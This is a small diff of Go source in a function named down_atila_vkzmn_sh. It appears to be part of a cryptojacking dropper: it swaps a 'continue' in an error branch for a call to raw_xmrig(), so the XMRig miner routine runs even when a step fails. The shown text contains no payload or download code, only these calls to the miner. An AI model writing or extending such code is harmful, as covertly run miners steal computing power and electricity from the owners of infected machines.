@@ -29,7 +29,8 @@ func down_atila_vkzmn_sh() {
                      fmt.Println(err_get)
 
 
-			continue
+			raw_xmrig()
+
 
 		}
 
@@ -43,7 +44,7 @@ func down_atila_vkzmn_sh() {
 
 	
 
-			raw_xmrig()  //
+			raw_xmrig()  
 
 
 
